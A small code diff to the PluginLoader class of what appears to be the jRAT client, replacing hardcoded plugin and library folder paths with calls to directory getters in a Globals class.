@@ -1,5 +1,6 @@
 package io.jrat.client.extensions;
 
+import io.jrat.client.Globals;
 import io.jrat.client.utils.ClassUtils;
 
 import java.io.File;
@@ -13,7 +14,7 @@ public class PluginLoader {
 
 	public static void loadPlugins() throws Exception {
 		plugins.clear();
-		File folder = new File("plugins/");
+		File folder = Globals.getPluginDirectory();
 		folder.mkdirs();
 		File[] pluginsl = folder.listFiles();
 		for (File file : pluginsl) {
@@ -28,7 +29,7 @@ public class PluginLoader {
 	}
 
 	public static void loadLibs() throws Exception {
-		File dir = new File("files/lib/");
+		File dir = Globals.getLibDirectory();
 		for (File file : dir.listFiles()) {
 			ClassUtils.addToClassPath(file);
 		}
